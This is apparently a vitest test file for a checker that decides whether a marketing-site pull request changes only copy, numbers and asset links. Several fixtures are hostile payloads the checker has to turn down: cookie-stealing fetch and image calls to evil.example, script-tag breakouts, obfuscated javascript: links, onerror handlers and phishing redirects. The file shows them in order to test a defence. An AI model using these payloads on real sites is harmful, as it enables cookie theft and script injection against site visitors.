import { describe, expect, it, vi } from 'vitest';
import {
  CONTENT_ONLY_MAX_FILES,
  checkContentOnlyPr,
  differsOnlyInContent,
  globToRegExp,
  isActiveUrl,
  isContentPath,
  isNotePath,
  looksLikeCode,
} from '../src/github/contentOnlyDiff.js';
import { REPO_REGISTRY } from '../src/repos/registry.js';

// Issue #701: a PR that only changes copy, numbers and asset links may be
// merged by builders without the usual review. "Only" is read from the
// files: the old and new versions must be the same program once content
// literals are masked, and no changed value may read like code or markup.

const policy = REPO_REGISTRY['newton-marketing-web'].contentPolicy!;

const HERO = `'use client';
import Image from 'next/image';
import { track } from '@/lib/analytics';

/** The page's first screen. */
export function Hero({ arm }: { arm: string }) {
  if (arm === 'no_form') return null;
  return (
    <section className="p-4" data-section="hero">
      <h1 title="AI Engineering">Become an AI engineer</h1>
      <p>{'Fees from'} {formatFee(150000)}</p>
      <Image src="https://cdn.example.com/hero.png" alt="Students coding" width={640} height={360} />
      <a href="/apply" onClick={() => track('apply_click')}>Apply now</a>
      <Banner heading="Admissions open" ctaText="Apply" delayMs={5000} />
    </section>
  );
}
`;

/** Shaped like the repo's real content files. */
const CONTENT = `/** Shared footer / contact. */
export const FOOTER = {
  phone: '+91 - 8792019038',
  phoneHref: 'tel:+91-8792019038',
} as const;

export const ADMISSION = {
  emiValue: '₹ 5,000',
  emiTotal: 'Total ₹ 1.3L* (inclusive of taxes)',
  fee: 150000,
  delta: -1,
  images: { hero: 'https://cdn.example.com/hero.png' },
  highlights: ['Live classes', 'Placement support'],
  dates: '12 Jan – 15 Feb 2027',
  formId: 'rcb-1',
};

export const DEADLINE = '2027-01-15';
`;

async function same(before: string, after: string, fileName = 'hero.tsx') {
  return differsOnlyInContent(before, after, fileName, policy);
}

describe('differsOnlyInContent: copy edits', () => {
  it.each([
    ['page text', HERO.replace('Become an AI engineer', 'Become a GenAI engineer')],
    ['a copy attribute', HERO.replace('alt="Students coding"', 'alt="Learners coding"')],
    ['a string child expression', HERO.replace("{'Fees from'}", "{'Fee starts at'}")],
    ['an image link', HERO.replace('hero.png', 'hero-v2.png')],
    ['a link target', HERO.replace('href="/apply"', 'href="/apply-now"')],
    ['a copy prop of a component', HERO.replace('heading="Admissions open"', 'heading="Admissions close soon"')],
    ['a prop named as copy', HERO.replace('ctaText="Apply"', 'ctaText="Apply today"')],
    [
      'comments and formatting',
      HERO.replace("/** The page's first screen. */", '// first screen\n// (hero)').replace(
        '  return (',
        '  return  (',
      ),
    ],
  ])('counts a change of %s as content', async (_case, after) => {
    expect(await same(HERO, after)).toBe(true);
  });

  it.each([
    ['a phone number and its link (marketing #1484)', CONTENT.replace(/8792019038/g, '6366275707')],
    ['a fee in words (marketing #1483)', CONTENT.replace('₹ 1.3L*', '₹ 1.5L*')],
    ['a number in a data object', CONTENT.replace('150000', '175000')],
    ['an amount in rupees', CONTENT.replace('₹ 5,000', '₹ 6,500')],
    ['dates with an en dash', CONTENT.replace('12 Jan – 15 Feb 2027', '19 Jan – 22 Feb 2027')],
    [
      'an asset link in an object',
      CONTENT.replace("hero: 'https://cdn.example.com/hero.png'", "hero: 'https://cdn.example.com/hero-2.png'"),
    ],
    ['an array element', CONTENT.replace('Live classes', 'Live classes, weekly')],
    [
      'a list breaking over lines',
      CONTENT.replace("['Live classes', 'Placement support']", "[\n    'Live classes',\n    'Placement support',\n  ]"),
    ],
  ])('counts a change of %s as content', async (_case, after) => {
    expect(await same(CONTENT, after, 'content.ts')).toBe(true);
  });

  it('ignores what a formatter adds when longer text no longer fits', async () => {
    const before = `export const A = () => <p>Short text <b>here</b></p>;\n`;
    const after = `export const A = () => (\n  <p>\n    A much longer text that wraps{' '}\n    <b>here</b>\n  </p>\n);\n`;
    expect(await same(before, after)).toBe(true);
  });
});

describe('differsOnlyInContent: changes of behaviour', () => {
  it.each([
    ['a class name', HERO.replace('className="p-4"', 'className="p-8"')],
    ['a data attribute', HERO.replace('data-section="hero"', 'data-section="top"')],
    ['a compared string', HERO.replace("arm === 'no_form'", "arm === 'with_form'")],
    ['a call argument', HERO.replace("track('apply_click')", "track('apply_tap')")],
    ['a call wrapping a number', HERO.replace('formatFee(150000)', 'formatFee(175000)')],
    ['an image size, which is layout', HERO.replace('width={640}', 'width={720}')],
    ['a behaviour prop of a component', HERO.replace('delayMs={5000}', 'delayMs={0}')],
    [
      'an added import',
      HERO.replace("import Image from 'next/image';", "import Image from 'next/image';\nimport Link from 'next/link';"),
    ],
    [
      'an added statement',
      HERO.replace(
        "  if (arm === 'no_form') return null;",
        "  if (arm === 'no_form') return null;\n  console.log(arm);",
      ),
    ],
    [
      'added markup',
      HERO.replace(
        '<h1 title="AI Engineering">Become an AI engineer</h1>',
        '<h1 title="AI Engineering">Become an <b>AI</b> engineer</h1>',
      ),
    ],
    ['text that becomes a template', HERO.replace("{'Fees from'}", '{`Fees from ${city}`}')],
  ])('does not count a change of %s as content', async (_case, after) => {
    expect(await same(HERO, after)).toBe(false);
  });

  it.each([
    ['an id-like key', CONTENT.replace("'rcb-1'", "'rcb-2'")],
    ['a number turned into text', CONTENT.replace('fee: 150000', "fee: '₹1.5L'")],
    ['a reference in place of a literal', CONTENT.replace("'2027-01-15'", 'NEXT_DEADLINE')],
    ['a number under a key that says nothing about numbers', CONTENT.replace('delta: -1', 'delta: -2')],
    ["a constant's whole value", CONTENT.replace("'2027-01-15'", "'2027-01-20'")],
  ])('does not count a change of %s as content', async (_case, after) => {
    expect(await same(CONTENT, after, 'content.ts')).toBe(false);
  });

  // The review of PR #704 found each of these passing as content.
  it.each([
    [
      'an inline script held in a template constant',
      "export const GATE_SCRIPT = `(function(){var a='${ATTR}';d.setAttribute(a,'on')})()`;",
      "export const GATE_SCRIPT = `(function(){var a='${ATTR}';fetch('https://evil.example/'+document.cookie)})()`;",
    ],
    [
      'an inline script held in a string constant',
      'const UNGATE_SCRIPT = \'(function(){w.removeAttribute("inert")})()\';',
      'const UNGATE_SCRIPT = \'(function(){new Image().src="https://evil.example/?"+document.cookie})()\';',
    ],
    [
      'a popup delay',
      'const POPUP_DELAY_MS = 50000; export function P(){ useEffect(()=>{ const t=setTimeout(open, POPUP_DELAY_MS); return ()=>clearTimeout(t); },[]); return null; }',
      'const POPUP_DELAY_MS = 0; export function P(){ useEffect(()=>{ const t=setTimeout(open, POPUP_DELAY_MS); return ()=>clearTimeout(t); },[]); return null; }',
    ],
    [
      'a time-zone offset and cut-off',
      "const IST_OFFSET_MS = 19_800_000; export const CUTOFF_HOUR_IST = 22; export const NUDGE_FORCE_PARAM = 'ds_nudge';",
      "const IST_OFFSET_MS = 0; export const CUTOFF_HOUR_IST = 24; export const NUDGE_FORCE_PARAM = 'x';",
    ],
    [
      'Next.js segment config',
      "export const dynamic = 'force-static'; export const revalidate = 3600; export const runtime = 'nodejs';",
      "export const dynamic = 'force-dynamic'; export const revalidate = 1; export const runtime = 'edge';",
    ],
    [
      'a returned experiment arm',
      "export function getVariant(){ return 'control'; }",
      "export function getVariant(){ return 'treatment'; }",
    ],
    [
      'a returned class string',
      "export function tone(on: boolean){ return on ? 'bg-green-600' : 'bg-gray-200'; }",
      "export function tone(on: boolean){ return on ? 'bg-red-600' : 'bg-gray-200'; }",
    ],
    [
      'an arrow returning a URL',
      "export const getBase = () => 'https://api.prod';",
      "export const getBase = () => 'https://evil';",
    ],
    [
      'an API URL fed to fetch',
      "const LEAD_URL = 'https://api.newtonschool.co/lead'; export const send = (b) => fetch(LEAD_URL, {method:'POST', body:b});",
      "const LEAD_URL = 'https://evil.example/lead'; export const send = (b) => fetch(LEAD_URL, {method:'POST', body:b});",
    ],
    [
      'an endpoints map',
      "export const ENDPOINTS = { submit: 'https://a' };",
      "export const ENDPOINTS = { submit: 'https://evil' };",
    ],
    [
      'a storage key',
      "const SEEN = 'popup_seen'; export const seen = () => localStorage.getItem(SEEN);",
      "const SEEN = 'popup_seen_v2'; export const seen = () => localStorage.getItem(SEEN);",
    ],
    [
      'an experiment split',
      'export const HERO_TEST = { split: 0.5, enabled: 1 };',
      'export const HERO_TEST = { split: 1, enabled: 0 };',
    ],
    [
      'robots metadata',
      "export const metadata = { robots: 'index, follow' };",
      "export const metadata = { robots: 'noindex, nofollow' };",
    ],
    [
      'class strings in a styles map',
      "export const styles = { card: 'p-4 bg-white' };",
      "export const styles = { card: 'p-4 bg-black' };",
    ],
  ])('does not count %s as content', async (_case, before, after) => {
    expect(await same(before, after, 'a.tsx')).toBe(false);
  });

  it.each([
    [
      'markup in a data object that ends up in JSON-LD',
      "export const schema = { description: 'Learn AI' };",
      "export const schema = { description: '</script><script>alert(1)</script>' };",
    ],
    [
      'raw HTML in a data object',
      "export const blurb = { text: '<b>Top</b> results' };",
      "export const blurb = { text: '<img src=x onerror=alert(1)>' };",
    ],
    [
      'code in a data object',
      "export const copy = { label: 'Apply now' };",
      "export const copy = { label: 'x;fetch(1)' };",
    ],
  ])('turns down %s even with no raw HTML in the file', async (_case, before, after) => {
    expect(await same(before, after, 'content.ts')).toBe(false);
  });

  it.each([
    [
      'JSON-LD rendered with dangerouslySetInnerHTML',
      'const schema = { description: \'Learn AI\' }; export const S = () => <script type="application/ld+json" dangerouslySetInnerHTML={{ __html: JSON.stringify(schema) }} />;',
      'const schema = { description: \'Learn AI today\' }; export const S = () => <script type="application/ld+json" dangerouslySetInnerHTML={{ __html: JSON.stringify(schema) }} />;',
    ],
    [
      'an object value that feeds an iframe',
      "const callback = { label: 'Call', link: 'https://forms.newton/x' }; export const N = () => <iframe src={callback.link} />;",
      "const callback = { label: 'Call', link: 'https://evil.example/phish' }; export const N = () => <iframe src={callback.link} />;",
    ],
  ])('turns down any change in a file with %s', async (_case, before, after) => {
    expect(await same(before, after)).toBe(false);
  });

  it.each([
    ['an HTML-entity spelling', 'export const A = () => <a href="&#106;avascript:alert(document.cookie)">Apply</a>;'],
    ['a template', 'export const A = ({q}) => <a href={`javascript:alert(1)//${q}`}>Apply</a>;'],
    ['a tab inside the scheme', "export const A = () => <a href={'java\\tscript:alert(1)'}>Apply</a>;"],
    ['a data: link', 'export const A = () => <a href="data:text/html,hi">Apply</a>;'],
  ])('turns down a link that runs code, written as %s', async (_case, after) => {
    const before = after.includes('${q}')
      ? 'export const A = ({q}) => <a href={`/apply?x=${q}`}>Apply</a>;'
      : "export const A = () => <a href={'/apply'}>Apply</a>;";
    const plainBefore = before.replace("{'/apply'}", '"/apply"');
    expect(await same(before, after)).toBe(false);
    expect(await same(plainBefore, after)).toBe(false);
  });

  it('treats the body of a <script> or <style> as code', async () => {
    const before = `export const A = () => <><style>{'.a { color: red }'}</style><p>Hi</p></>;\n`;
    expect(await same(before, before.replace('red', 'blue'))).toBe(false);
  });

  it('only counts <meta> content that describes the page', async () => {
    const meta = (name: string, content: string) =>
      `export const M = () => <meta name="${name}" content="${content}" />;`;
    expect(await same(meta('description', 'Learn AI'), meta('description', 'Learn GenAI'))).toBe(true);
    expect(await same(meta('robots', 'index'), meta('robots', 'noindex'))).toBe(false);
    const refresh = (url: string) => `export const M = () => <meta httpEquiv="refresh" content="0;url=${url}" />;`;
    expect(await same(refresh('/a'), refresh('/b'))).toBe(false);
  });

  it('is undefined when a version does not parse', async () => {
    expect(await same(HERO, HERO.replace('</section>', '</sectio'))).toBeUndefined();
  });
});

// Round 2 of the review of PR #704: values in data objects that are
// identifiers, links or knobs passed because their keys were not on the
// knob list. Each case is shaped like a real file in the marketing repo.
// Round 3 of the review of PR #704: values in data now count as copy by an
// allow list. Each case is shaped like a real file in the marketing repo.
describe('differsOnlyInContent: copy by allow list', () => {
  const data = (fields: string) => `export const X = { ${fields} };`;
  const change = async (before: string, after: string, file = 'content.ts') => same(before, after, file);

  it.each([
    [
      'a snake-case id under a copy prop',
      'export const A = () => <Card cta="hero_contact_us" />;',
      'export const A = () => <Card cta="nav_request_callback" />;',
    ],
    ['a snake-case id under a copy key', data("label: 'hero_cta'"), data("label: 'nav_cta'")],
    ['a kebab-case id under a copy key', data("heading: 'hero-apply'"), data("heading: 'nav-apply'")],
    ['a camel-case id under a copy key', data("title: 'heroCta'"), data("title: 'navCta'")],
    [
      'an id under `cta`, which is not a copy key',
      data("cta: 'training_corporate_get_in_touch'"),
      data("cta: 'training_agentic_get_in_touch'"),
    ],
    [
      'words under a `…Cta` prop, which is not a copy prop',
      'export const A = () => <Hero primaryCta="Apply now" />;',
      'export const A = () => <Hero primaryCta="Enroll now" />;',
    ],
  ])('turns down %s (item 1)', async (_case, before, after) => {
    expect(await change(before, after, 'a.tsx')).toBe(false);
  });

  const CDN = 'https://d3dyfaf3iutrxo.cloudfront.net/general/upload';
  it.each([
    ['a PDF moved off the CDN', data(`pdf: '${CDN}/a.pdf'`), data("pdf: 'https://evil.example/sign-in'")],
    [
      'a brochure moved off the CDN',
      `export const IMAGES = { brochurePdf: '${CDN}/b.pdf' };`,
      "export const IMAGES = { brochurePdf: 'https://evil.example/b' };",
    ],
    [
      'a site image moved to another host',
      data("heroImage: '/images/hero.png'"),
      data("heroImage: 'https://evil.example/hero.png'"),
    ],
    [
      'an image source moved off the CDN',
      `export const A = () => <img src="${CDN}/a.png" alt="x" />;`,
      'export const A = () => <img src="https://evil.example/a.png" alt="x" />;',
    ],
    [
      'a script moved to another host',
      data("widgetSrc: 'https://widget.example/embed.js'"),
      data("widgetSrc: 'https://evil.example/x.js'"),
    ],
    // Final review: built links, every link in a value, and SVG images.
    [
      'a built image link moved off the CDN',
      'export const A = ({ x }: { x: string }) => <img src={`' + CDN + '/${x}.webp`} alt="" />;',
      'export const A = ({ x }: { x: string }) => <img src={`https://evil.example/${x}.webp`} alt="" />;',
    ],
    [
      'a built image link that keeps its host',
      'export const A = ({ x }: { x: string }) => <img src={`' + CDN + '/${x}.webp`} alt="" />;',
      'export const A = ({ x }: { x: string }) => <img src={`' + CDN + '/v2/${x}.webp`} alt="" />;',
    ],
    [
      'a built PDF link on a component',
      'export const R = ({ id }: { id: string }) => <ReportViewer src={`' + CDN + '/${id}.pdf`} />;',
      'export const R = ({ id }: { id: string }) => <ReportViewer src={`https://evil.example/${id}`} />;',
    ],
    [
      'a second srcSet candidate moved off the CDN',
      `export const A = () => <img srcSet="${CDN}/a.png 1x, ${CDN}/b.png 2x" alt="" />;`,
      `export const A = () => <img srcSet="${CDN}/a.png 1x, https://evil.example/b.png 2x" alt="" />;`,
    ],
    [
      'a srcSet that starts with a path',
      `export const A = () => <img srcSet="/a.png 1x, ${CDN}/b.png 2x" alt="" />;`,
      'export const A = () => <img srcSet="/a.png 1x, https://evil.example/b.png 2x" alt="" />;',
    ],
    [
      'an SVG image moved off the CDN',
      `export const A = () => <svg><image href="${CDN}/a.png" /></svg>;`,
      'export const A = () => <svg><image href="https://evil.example/a.png" /></svg>;',
    ],
  ])('turns down %s (item 2)', async (_case, before, after) => {
    expect(await change(before, after, 'a.tsx')).toBe(false);
  });

  it.each([
    ['a PDF swapped for another on the CDN', data(`pdf: '${CDN}/a.pdf'`), data(`pdf: '${CDN}/b.pdf'`)],
    [
      'a legacy Webflow image moved to the CDN',
      data("heroImage: 'https://cdn.prod.website-files.com/a.png'"),
      data(`heroImage: '${CDN}/a.png'`),
    ],
    [
      'a video swapped on YouTube',
      data("videoUrl: 'https://www.youtube.com/embed/abc'"),
      data("videoUrl: 'https://www.youtube.com/embed/def'"),
    ],
    [
      'a link the reader follows, to another site',
      data("href: 'https://yourstory.com/a'"),
      data("href: 'https://www.thehindu.com/b'"),
    ],
    [
      'a link under `…Link`, to another site',
      data("caseStudyLink: 'https://a.example/x'"),
      data("caseStudyLink: 'https://b.example/y'"),
    ],
    [
      'a srcSet whose candidates stay on the CDN',
      `export const A = () => <img srcSet="${CDN}/a.png 1x, ${CDN}/b.png 2x" alt="" />;`,
      `export const A = () => <img srcSet="${CDN}/a2.png 1x, ${CDN}/b2.png 2x" alt="" />;`,
    ],
    [
      'a built link the reader follows',
      'export const A = ({ x }: { x: string }) => <a href={`/courses/${x}`}>Go</a>;',
      'export const A = ({ x }: { x: string }) => <a href={`/programs/${x}`}>Go</a>;',
    ],
  ])('keeps %s (item 2)', async (_case, before, after) => {
    expect(await change(before, after, 'a.tsx')).toBe(true);
  });

  it.each([
    [
      'a predictor category sent with a query',
      "export const PREDICTOR = { categories: ['General (PwD)', 'OBC'] };",
      "export const PREDICTOR = { categories: ['General (Divyang)', 'OBC'] };",
    ],
    [
      'a domicile state',
      "export const PREDICTOR = { domicileStates: ['Andhra Pradesh'] };",
      "export const PREDICTOR = { domicileStates: ['Andhra Pradesh State'] };",
    ],
    [
      'a degree a filter matches on',
      "export const DEGREE_GROUPS = [{ name: 'BTech', degrees: ['Bachelor of Technology'] }];",
      "export const DEGREE_GROUPS = [{ name: 'BTech', degrees: ['Bachelor of Tech'] }];",
    ],
    [
      'a trusted sender list',
      "export const TRUSTED_SENDERS = ['Newton School', 'NST Admissions'];",
      "export const TRUSTED_SENDERS = ['Evil Corp', 'NST Admissions'];",
    ],
  ])('turns down a list entry that may be a lookup: %s (item 3)', async (_case, before, after) => {
    expect(await change(before, after)).toBe(false);
  });

  it.each([
    [
      'a curriculum item',
      "export const MODULE = { items: ['Python proficiency and basics'] };",
      "export const MODULE = { items: ['Python proficiency and fundamentals'] };",
    ],
    [
      'a table cell',
      "export const ROWS = [['Abhishek Kunwar', 'Google']];",
      "export const ROWS = [['Abhishek Kunwar', 'Microsoft']];",
    ],
    [
      'a heading line',
      "export const HERO = { titleLines: ['Learn AI', 'in 6 months'] };",
      "export const HERO = { titleLines: ['Learn GenAI', 'in 6 months'] };",
    ],
    [
      'a fee feature',
      "export const FEE_FEATURES = ['Easy EMI available'];",
      "export const FEE_FEATURES = ['Easy EMI from ₹7,950'];",
    ],
    [
      'a skill chip',
      "export const ROLE = { skills: ['SQL', 'Python'] };",
      "export const ROLE = { skills: ['SQL', 'Tableau'] };",
    ],
  ])('keeps a list entry in a list of copy: %s (item 3)', async (_case, before, after) => {
    expect(await change(before, after)).toBe(true);
  });

  it.each([
    [
      'a bitmask',
      'export const SKILL_BIT = { python: 1, excel: 2 };',
      'export const SKILL_BIT = { python: 1, excel: 1 };',
    ],
    [
      'a slider step',
      'export const RANGE_SPEC = { yoe: { step: 1 } };',
      'export const RANGE_SPEC = { yoe: { step: 0 } };',
    ],
    [
      'a days threshold',
      "export const AVAILABILITY = [{ label: 'In 15 days', days: 15 }];",
      "export const AVAILABILITY = [{ label: 'In 15 days', days: 90 }];",
    ],
    ['an autoplay timing', data("title: 'a', autoAdvance: 5000"), data("title: 'a', autoAdvance: 1")],
    [
      'a cohort split',
      'export const X = { cohorts: { a: 50, b: 50 } };',
      'export const X = { cohorts: { a: 0, b: 100 } };',
    ],
    ['a number in a list', 'export const X = { weights: [1, 2, 3] };', 'export const X = { weights: [1, 2, 9] };'],
    // Final review: only the last word says a number is copy, and no word may be a knob.
    ['a number whose first word only reads as copy', data('seatsLeft: 12'), data('seatsLeft: 0')],
    ['a retry count', 'export const NET = { retryCount: 3 };', 'export const NET = { retryCount: 0 };'],
    [
      'a rollout percentage',
      'export const FLAGS = { percentRollout: 10 };',
      'export const FLAGS = { percentRollout: 100 };',
    ],
    ['an end index', 'export const LIST = { endIndex: 3 };', 'export const LIST = { endIndex: 30 };'],
    ['a chart radius', 'export const CHART = { statRadius: 40 };', 'export const CHART = { statRadius: 4 };'],
    ['a count in an A/B object', 'const HERO_AB = { percent: 50 };', 'const HERO_AB = { percent: 100 };'],
  ])('turns down %s (item 4)', async (_case, before, after) => {
    expect(await change(before, after)).toBe(false);
  });

  it.each([
    ['a rating', data('rating: 4.7'), data('rating: 4.8')],
    ['a student count', data('studentCount: 12000'), data('studentCount: 15000')],
    ['a star rating', data('ratingStars: 4'), data('ratingStars: 5')],
    ['a fee amount', data('feeAmount: 150000'), data('feeAmount: 175000')],
    ['a fee', data('fee: 150000'), data('fee: 175000')],
    ['a count-up end', data("end: 93, suffix: '%'"), data("end: 98.3, suffix: '%'")],
    ['a number under a copy key', data('heading: 2026'), data('heading: 2027')],
  ])('keeps %s (item 4)', async (_case, before, after) => {
    expect(await change(before, after)).toBe(true);
  });

  it.each([
    [
      'a class list under a `…ClassName` key',
      data("labelClassName: 'text-ds-ink font-medium'"),
      data("labelClassName: 'hidden font-medium'"),
    ],
    ['a class list under `rowClassName`', data("rowClassName: 'flex gap-2'"), data("rowClassName: 'hidden gap-2'")],
    [
      'a class list under a copy key',
      data("title: 'flex items-center gap-2'"),
      data("title: 'hidden items-center gap-2'"),
    ],
    [
      'a variant-prefixed class',
      "export const CARD_OFF_AT = ['group-data-[step=2]/hiw:pointer-events-none'];",
      "export const CARD_OFF_AT = ['group-data-[step=2]/hiw:pointer-events-auto'];",
    ],
    [
      'an arbitrary background',
      data("chip: 'bg-white border-[#edeff3]'"),
      data("chip: 'bg-[url(https://evil.example/p.png)] border-[#edeff3]'"),
    ],
    [
      'a CSS gradient',
      data("gradient: 'linear-gradient(90deg, #fff, #000)'"),
      data("gradient: 'url(https://evil.example/x.png) center'"),
    ],
  ])('turns down %s (item 5)', async (_case, before, after) => {
    expect(await change(before, after)).toBe(false);
  });

  it.each([
    [
      'aria-controls',
      'export const A = () => <button aria-controls="faq-panel">x</button>;',
      'export const A = () => <button aria-controls="other-panel">x</button>;',
      false,
    ],
    [
      'aria-labelledby',
      'export const A = () => <div aria-labelledby="h1">x</div>;',
      'export const A = () => <div aria-labelledby="h2">x</div>;',
      false,
    ],
    [
      'aria-label',
      'export const A = () => <button aria-label="Next slide">x</button>;',
      'export const A = () => <button aria-label="Next story">x</button>;',
      true,
    ],
  ])('treats %s as copy or not (item 6)', async (_case, before, after, expected) => {
    expect(await change(before, after, 'a.tsx')).toBe(expected);
  });

  it.each([
    [
      'an escaped closing script tag',
      'export const A = () => <Faq answer="Yes we do." />;',
      'export const A = () => <Faq answer="Yes&lt;/script&gt;&lt;script&gt;alert(1)" />;',
      false,
    ],
    [
      'a numeric escape of a tag',
      'export const A = () => <Faq answer="Yes we do." />;',
      'export const A = () => <Faq answer="Yes&#60;/script&#62;" />;',
      false,
    ],
    [
      'a curly apostrophe',
      'export const A = () => <Card title="Industry&rsquo;s top" />;',
      'export const A = () => <Card title="Industry&rsquo;s best" />;',
      true,
    ],
  ])('reads %s in a JSX value (item 7)', async (_case, before, after, expected) => {
    expect(await change(before, after, 'a.tsx')).toBe(expected);
  });
});

describe('differsOnlyInContent: values that are not words', () => {
  const object = (fields: string) => `export const DS_APPLY = { ${fields} } as const;`;

  it.each([
    ['a course type sent with the lead', "courseType: 'certification-data-science'", "courseType: 'btech_in_cs'"],
    ['a URL slug', "urlSlug: 'data-science-ad-lp'", "urlSlug: 'ncet-su-website'"],
    ['a lead source tag', "from: 'download_brochure_2'", "from: 'organic'"],
    ['which form a button opens', "mode: 'rcb', heading: 'Download'", "mode: 'signup', heading: 'Download'"],
    ['a typo in a union member', "mode: 'rcb', heading: 'Download'", "mode: 'rbc', heading: 'Download'"],
    ['a button identifier under any key', "APPLY: 'conversion-banner-apply-cta-nl'", "APPLY: 'x'"],
    ['a utm page identifier', "utmPageIdentifier: 'gen_ai_masterclass'", "utmPageIdentifier: 'other'"],
    ['a route slug', "slug: 'bangalore'", "slug: 'bengaluru'"],
    [
      'a site verification token',
      "googleSiteVerification: 'xTFfnMXNgFr_JAp60AHE'",
      "googleSiteVerification: 'ATTACKER_TOKEN'",
    ],
    [
      'a qualifier answer sent with the lead',
      "label: 'Undergraduate', value: 'Undergraduate'",
      "label: 'Undergraduate', value: 'Postgraduate'",
    ],
    ['an SEO path', "path: '/', tempPath: '/temp'", "path: '/temp', tempPath: '/'"],
    ['a seat limit', "maxSeats: 30, label: 'x'", "maxSeats: 0, label: 'x'"],
    [
      'a fetch URL',
      "heading: 'Apply', submitTo: 'https://api.newton/lead'",
      "heading: 'Apply', submitTo: 'https://evil.example/lead'",
    ],
    ['a redirect path', "successPath: '/thank-you'", "successPath: 'https://evil.example'"],
    ['a next URL', "next: '/thank-you'", "next: 'https://evil.example'"],
    ['a form action', "formAction: '/submit'", "formAction: 'https://evil.example'"],
    ['an iframe source', "signupIframe: 'https://forms.example/a'", "signupIframe: 'https://evil.example/phish'"],
    ['an embed source', "formEmbed: 'https://forms.example/a'", "formEmbed: 'https://evil.example/phish'"],
    ['a one-word value under a key that holds no words', "track: 'certification'", "track: 'btech'"],
  ])('turns down %s', async (_case, before, after) => {
    expect(await same(object(before), object(after), 'content.ts')).toBe(false);
  });

  it.each([
    [
      'a host allowlist',
      "const WHATSAPP_HOSTS = ['wa.me', 'wa.link'];",
      "const WHATSAPP_HOSTS = ['evil.example', 'wa.link'];",
    ],
    ['an exported list of one-word values', "export default ['wa.me'];", "export default ['evil.example'];"],
    [
      'a default-exported destination',
      "export default { destination: 'https://a' };",
      "export default { destination: 'https://evil' };",
    ],
    [
      'an override after a spread',
      "const BASE = { heading: 'a' }; export const X = { ...BASE, courseType: 'ds' };",
      "const BASE = { heading: 'a' }; export const X = { ...BASE, courseType: 'web' };",
    ],
    [
      'an object passed as a copy prop',
      "export const A = () => <Hero primaryCta={{ label: 'Apply', from: 'hero_apply', mode: 'rcb' }} />;",
      "export const A = () => <Hero primaryCta={{ label: 'Apply', from: 'other', mode: 'signup' }} />;",
    ],
    [
      'an object as JSX children',
      "export const A = () => <Provider>{{ submitTo: 'https://a' }}</Provider>;",
      "export const A = () => <Provider>{{ submitTo: 'https://evil' }}</Provider>;",
    ],
    [
      'a script built from a closed string',
      "export const X = { label: 'Apply' };",
      "export const X = { label: \"'+top.location.assign('//evil.example')+'\" };",
    ],
    [
      'a link to the site itself, which its lint forbids',
      "export const NEWS = [{ title: 'Startups', href: 'https://yourstory.com/a' }];",
      "export const NEWS = [{ title: 'Startups', href: 'https://www.newtonschool.co/apply' }];",
    ],
  ])('turns down %s', async (_case, before, after) => {
    expect(await same(before, after, 'a.tsx')).toBe(false);
  });

  it.each([
    ['a stat', "stat: '93%'", "stat: '98.3%'"],
    ['a fee', "fee: '₹1.3L'", "fee: '₹1.5L'"],
    ['a count', "learners: '50,000+'", "learners: '60,000+'"],
    ['a closing date', "closesOn: '2026-11-30'", "closesOn: '2027-01-15'"],
    ['a phone link', "phoneHref: 'tel:+91-6366275707'", "phoneHref: 'tel:+91-9999999999'"],
    ['a one-word label', "label: 'Apply'", "label: 'Enroll'"],
    ['a one-word button', "ctaText: 'Apply'", "ctaText: 'Register'"],
    ['a company name', "company: 'Google'", "company: 'Microsoft'"],
    ['an image link', "heroImage: 'https://cdn.example.com/a.png'", "heroImage: 'https://cdn.example.com/b.png'"],
    ['a video link', "videoUrl: 'https://www.youtube.com/embed/abc'", "videoUrl: 'https://www.youtube.com/embed/def'"],
    ['a CTA link', "ctaHref: '/apply'", "ctaHref: '/apply-now'"],
    [
      'an image in a map of images',
      "images: { hero: 'https://cdn.example.com/a.png' }",
      "images: { hero: 'https://cdn.example.com/b.png' }",
    ],
    ['an outside article link', "href: 'https://yourstory.com/a'", "href: 'https://yourstory.com/b'"],
  ])('keeps %s as content', async (_case, before, after) => {
    expect(await same(object(before), object(after), 'content.ts')).toBe(true);
  });

  it.each([
    [
      'copy with a semicolon',
      "export const X = { body: 'Learn Python, master SQL' };",
      "export const X = { body: 'Learn Python; master SQL' };",
    ],
    [
      'JSX text with a character reference',
      'export const A = () => <h2>Industry&rsquo;s Top Experts</h2>;',
      'export const A = () => <h2>Industry&rsquo;s Best Experts</h2>;',
    ],
    [
      'a JSX template around a number',
      'export const A = ({ n }: { n: number }) => <p>{`Only ${n} seats left`}</p>;',
      'export const A = ({ n }: { n: number }) => <p>{`Just ${n} seats left`}</p>;',
    ],
    [
      'a one-word heading prop',
      'export const A = () => <Hero heading="Apply" />;',
      'export const A = () => <Hero heading="Enroll" />;',
    ],
    [
      'a file that names <iframe> only in a comment',
      "/** Signup form embedded as an <iframe>. */\nexport const X = { heading: 'Old' };",
      "/** Signup form embedded as an <iframe>. */\nexport const X = { heading: 'New' };",
    ],
    [
      'a sentence that ends in the word document',
      "export const X = { body: 'See the end of the document.' };",
      "export const X = { body: 'See the end of this document.' };",
    ],
  ])('keeps %s as content', async (_case, before, after) => {
    expect(await same(before, after, 'a.tsx')).toBe(true);
  });

  it('still turns down a comment-only mention once the file really renders an iframe', async () => {
    const before = "/** <iframe> */\nexport const A = () => <iframe src='/a' title='Old' />;";
    expect(await same(before, before.replace("'Old'", "'New'"))).toBe(false);
  });
});

describe('looksLikeCode and isActiveUrl', () => {
  it.each([
    'Total ₹ 1.5L* (inclusive of taxes)',
    '+91 - 6366275707',
    'tel:+91-6366275707',
    '93% placed',
    '12 Jan – 15 Feb 2027',
    'Fees&nbsp;₹1.5L',
    'Learn how a function works',
    'Fees: ₹1,49,999; EMI available',
    'Mon–Fri; 7–9 PM',
    'Q&A; live',
    'Industry&rsquo;s Top Experts',
    "Four profile images and one with '1k+' text on black",
    'See the end of the document.',
    'Score <90%',
  ])('reads %j as copy', text => {
    expect(looksLikeCode(text)).toBe(false);
  });

  it.each([
    '</script><script>',
    '<b>bold</b>',
    'a{b}',
    '() => 1',
    'document.cookie',
    'fetch(url)',
    'function (){}',
    "top.location='//evil'",
    'import("//evil.example/x.js")',
    "'+top.location.assign('//evil.example')+'",
    'javascript&colon;alert(1)',
  ])('reads %j as code', text => {
    expect(looksLikeCode(text)).toBe(true);
  });

  it.each([
    'javascript:alert(1)',
    ' JaVaScRiPt:x',
    '&#106;avascript:x',
    '&#x6A;avascript:x',
    'java\tscript:x',
    'java&Tab;script:x',
    'data:text/html,x',
    'vbscript:x',
  ])('spots %j as a link that runs code', text => {
    expect(isActiveUrl(text.replace('&Tab;', '&tab;'))).toBe(true);
  });

  it('lets ordinary links through', () => {
